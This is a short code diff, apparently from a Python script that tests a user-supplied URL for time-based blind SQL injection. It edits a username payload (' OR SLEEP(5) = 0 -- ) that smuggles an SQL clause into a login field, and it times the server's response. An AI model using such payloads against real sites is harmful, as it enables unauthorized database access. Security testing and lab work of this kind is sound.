@@ -3,8 +3,8 @@ import time
 
 url = input("Choose url: ")
 
-username = "' OR SLEEP(5) = 0 --"
-password = "' OR SLEEP(5) = 0 --"
+username = "' OR SLEEP(5) = 0 -- "
+password = "whatever"
 
 start_time = time.time()
 
